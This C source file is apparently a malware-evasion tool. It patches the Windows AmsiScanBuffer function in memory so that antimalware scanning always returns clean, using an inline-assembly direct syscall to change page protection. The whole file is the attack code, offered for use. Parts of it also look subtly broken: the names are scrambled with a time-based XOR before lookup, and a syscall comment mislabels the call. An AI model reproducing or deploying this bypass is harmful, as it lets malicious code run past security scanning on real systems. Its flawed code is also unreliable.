//2025 by gbr/kaIIsyms   shitty amsi bypass (memory patching amsiscanbuffer)
#include <stdio.h>
#include <stdlib.h>
#include <metahost.h>
#include <windows.h>
#include <time.h>

#pragma comment(lib, "mscoree.lib")

#define ProcAtual() ((HANDLE)-1) //0xFFFFFFFF
#define NAKED __declspec(naked)

FARPROC resolv(LPCSTR nomeModulo, LPCSTR nomeProc) {
    HMODULE hModulo = LoadLibraryA(nomeModulo);
    return GetProcAddress(hModulo, nomeProc);
}

char *rcd(const char *base, int seed) {
    size_t len = strlen(base);
    char* reconstruido = malloc(len+0x01);
  
    for (size_t i = 0x00; i < len; i++) {
        reconstruido[i] = base[i]^((seed+i)%0x07);
    }
  
    reconstruido[len] = '\0';

    return reconstruido;
}

NAKED NTSTATUS stomp(HANDLE HandleProcesso, PVOID* EnderecoBase, PULONG TamanhoRegiao, ULONG NovaProtecao, PULONG ProtecaoAntiga) {
    __asm { //https://www.hackplayers.com/2025/02/nuevas-tendencias-en-evasion-de-edrs-2025.html
        mov r10, rcx
        mov eax, 0x50 //NtAllocateVirtualMemory
        syscall
        ret
    }
}

int main() {
    char *nomeAmsi = rcd("amsi.dll", time(NULL));
    HMODULE moduloAmsi = LoadLibraryA(nomeAmsi);
    char *nomeAmsiScan = rcd("AmsiScanBuffer", time(NULL));
    void *localizacaoAmsiScan = resolv("amsi.dll", nomeAmsiScan);
  
    free(nomeAmsi);
    free(nomeAmsiScan);

    if (localizacaoAmsiScan) {
        ULONG protecaoAntiga;
        SIZE_T tamanhoRegiao = 0x1000;
        if (stomp(ProcAtual(), &localizacaoAmsiScan, &tamanhoRegiao, PAGE_EXECUTE_READWRITE, &protecaoAntiga) == 0x00) {
            unsigned char patch[] = {0x31, 0xC0, 0xC3};
            memcpy(localizacaoAmsiScan, patch, sizeof(patch));
            stomp(ProcAtual(), &localizacaoAmsiScan, &tamanhoRegiao, protecaoAntiga, &protecaoAntiga);
            printf("[+] ASB patcheado\x0d\x0a");
        } else {
            printf("[-] falha ao patchear AmsiScanBuffer\x0d\x0a");
        }
    }
    return 0;
}
